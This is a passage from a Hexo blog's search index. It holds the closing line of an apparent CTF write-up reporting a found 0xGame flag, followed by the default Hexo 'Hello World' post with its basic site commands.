alt="image.png"></p><p>找到了flag</p><p>0xGame{3fc49725-23b5-4f28-8c64-16a3459b67b7}</p>]]></content>
    
    
    
    <tags>
      
      <tag>misc&amp;web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/10/10/hello-world/"/>
    <url>/2023/10/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
